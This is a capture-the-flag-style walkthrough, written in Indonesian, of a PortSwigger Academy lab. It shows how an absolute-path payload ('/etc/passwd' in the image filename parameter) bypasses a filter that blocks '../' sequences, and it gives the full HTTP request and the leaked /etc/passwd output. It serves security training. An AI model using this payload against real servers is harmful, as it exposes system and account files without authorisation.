# [PortSwigger Academy] Path Traversal - Lab #2

## 📌 Detail Lab
* **Nama Tantangan:** File path traversal, traversal sequences blocked with absolute path bypass
* **Tingkat Kesulitan:** APPRENTICE
* **Kategori:** Path Traversal (Directory Traversal)
* **Tujuan Lab:** Membaca isi file `/etc/passwd` dengan melakukan bypass pada filter yang memblokir urutan karakter traversal (`../`) menggunakan metode *Absolute Path*.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Aplikasi memuat gambar produk melalui parameter `filename` pada endpoint `/image`. Jika kita mencoba memasukkan payload standar seperti `../../../etc/passwd`, aplikasi kemungkinan besar akan memblokirnya atau mengembalikan error karena mendeteksi urutan karakter `../`.

Namun, mekanisme pertahanan pada kode backend hanya terfokus pada pembersihan/pemeriksaan karakter navigasi relatif (`../`). Sistem langsung meneruskan input ke fungsi pembaca file tanpa memeriksa apakah input tersebut berupa jalur absolut (*absolute path*) yang dimulai langsung dari root direktori sistem (`/`).

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Identifikasi dan Pengujian Filter
Tangkap request pemuatan gambar menggunakan Burp Suite, lalu kirim ke Burp Repeater. Jika kita menguji dengan `filename=../../../../etc/passwd`, file gagal dimuat karena urutan sekuensial tersebut diblokir oleh sistem.

### Bypass Menggunakan Absolute Path
Karena sistem langsung membaca input dari root jika diberikan jalur penuh, kita bisa langsung memasukkan lokasi absolut dari file `/etc/passwd` tanpa perlu menggunakan `../` untuk naik direktori.

* **Payload:** `/etc/passwd`

Request HTTP final di Burp Repeater:
```http
GET /image?filename=/etc/passwd HTTP/2
Host: 0a8b00a40415758a80f9c19f006b0061.web-security-academy.net
```

### Hasil Eksekusi
Kirim request tersebut. Aplikasi merespons dengan status HTTP 200 OK dan menampilkan seluruh isi berkas /etc/passwd secara transparan:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
```
Hasil Akhir: Teknik bypass menggunakan absolute path berhasil mengeksfiltrasi data sensitif dari server lokal. Lab dinyatakan selesai (Solved).